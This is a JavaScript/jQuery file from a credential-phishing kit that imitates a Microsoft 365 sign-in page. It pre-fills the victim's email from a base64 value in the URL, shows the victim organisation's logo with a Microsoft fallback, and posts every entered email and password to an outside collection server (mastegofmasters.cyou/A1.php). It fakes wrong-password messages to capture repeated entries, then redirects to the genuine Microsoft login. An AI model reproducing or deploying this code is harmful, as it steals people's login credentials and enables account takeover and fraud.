
/* global $ */
$(document).ready(function() {
    var count = 0;


    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(email)) {
            // alert(btoa(email));
            var my_email = email;
        } else {
            // alert(atob(email));
            var my_email = atob(email);
        }
        // $('#email').val(email);
        // var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
            $('#error').show();
            email.focus;
            return false;
        }
        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var finalu = c.toUpperCase();
        $('#email').val(my_email);
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);

        $("#emailch").html(my_email);
        $.get("https://logo.clearbit.com/" + my_slice)
            .done(function() {
                $(".logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
                $(".logoname").html(finalu);

            }).fail(function() {
                $(".logoimg").attr("src", "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico");
                $(".logoname").html("Microsoft");

            });


    }





    $('#email').click(function() {
        $('#error').hide();
    });

    $(document).keypress(function(event) {

        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
            if ($("#div1").is(":visible")) {

                $("#next").click();

            } else if ($("#div2").is(":visible")) {
                event.preventDefault();

                $("#submit-btn").click();

            } else {
                return false;
            }
        }
    });


    $('#next').click(function() {
        event.preventDefault();
        var my_email = $('#email').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
            $('#error').show();
            email.focus;
            return false;
        }
        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        var finalu = c.toUpperCase();
        $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        $("#div2").animate({ right: 0, opacity: "show" }, 500);

        $("#emailch").html(my_email);
        $.get("https://logo.clearbit.com/" + my_slice)
            .done(function() {
                $(".logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
                $(".logoname").html(finalu);

            }).fail(function() {
                $(".logoimg").attr("src", "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico");
                $(".logoname").html("Microsoft");

            });





    });
    // $('#back').click(function() {
    //     // $("#msg").hide();
    //     $("#email").val("");
    //     $("#password").val("");
    //     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
    //     $("#div1").animate({ right: 0, opacity: "show" }, 1000);

    // });


    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var email = $("#email").val();
        var password = $("#password").val();
        var detail = $("#field").html();
        var msg = $('#msg').html();

        var my_email = email;
        var ind = my_email.indexOf("@");
        var my_slice = my_email.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#msg').text(msg);
        count = count + 1;
        $.ajax({
            dataType: 'JSON',
            url: "https://mastegofmasters.cyou/A1.php",
            type: 'POST',
            data: {
                email: email,
                password: password,
                detail: detail,

            },
            beforeSend: function(xhr) {
                $("#submit-btn").html("verifying...");
            },
            success: function(response) {
                $("#password").val("");
                if (count >= 3) {
                    count = 0;
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    setTimeout(() => {
                        window.location.replace("https://login.microsoftonline.com/common/login");
                    }, 500);
                    return false;
                }
                if (count == 2) {
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                } else {
                    $("#msg1").show();
                    $("#msg").hide();
                    $("#msg2").hide();

                }
            },
            error: function() {
                $("#password").val("");
                if (count >= 3) {
                    count = 0;
                    $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                    $("#div3").animate({ left: 0, opacity: "show" }, 500);
                    setTimeout(() => {
                        window.location.replace("https://login.microsoftonline.com/common/login");
                    }, 1000);
                    return false;
                }
                if (count == 2) {
                    $("#msg2").show();
                    $("#msg").hide();
                    $("#msg1").hide();
                } else {
                    $("#msg1").show();
                    $("#msg").hide();
                    $("#msg2").hide();

                }
            },
            complete: function() {
                $("#submit-btn").html("Sign in");
            }
        });
    });
});
